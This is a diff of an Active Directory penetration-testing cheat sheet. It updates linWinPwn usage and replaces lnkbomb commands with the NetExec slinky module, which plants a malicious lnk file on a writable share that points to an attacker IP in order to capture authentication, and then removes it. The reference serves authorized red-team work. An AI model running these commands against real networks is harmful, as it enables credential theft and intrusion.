@@ -289,7 +289,7 @@ How to pentest like a Gunnaj
   - Module mssql_enum
       - Check mssql privilege escalation paths
   ```shell
-  sudo ./linWinPwn.sh -t <Domain_Controller_IP> -u <AD_user> -p <AD_password> -o <output_dir>
+  sudo ./linWinPwn.sh -t <Domain_Controller_IP_or_Target_Domain> -u <AD_user> -p <AD_password> -o <output_dir>
   ```
 </details>
 
@@ -313,16 +313,16 @@ How to pentest like a Gunnaj
   ```
  </details>
  <details>
-  <summary> lnkbomb </summary> 
+  <summary> NetExec lnkfile with slinky </summary> 
   
-  ### Create a lnk file for a share with read/write rights
+  ### Creates a lnk file for a share with read/write rights
   ```shell
-  python3 lnkbomb.py -t <target_IP> -a <attacker_IP> -s Shared -u <AD_user> -p <AD_password> -n <server_name> --windows
+  NetExec -smb <Domain_Controller_IP_or_Target_Domain> -u <AD_user> -p <AD_password> -M slinky -o NAME=<filename> SERVER=<attacker_IP>
   ```
    
   ### Remove the lnk file
   ```basb
-  python3 lnkbomb.py -t <target_IP> -a <attacker_IP> -s Shared -u <AD_user> -p <AD_password> -n <server_name> --windows -r <file_name.url>
+  NetExec -smb <Domain_Controller_IP_or_Target_Domain> -u <AD_user> -p <AD_password> -M slinky -o NAME=<filename> SERVER=<attacker_IP> CLEANUP=True
   ```
     
 </details>
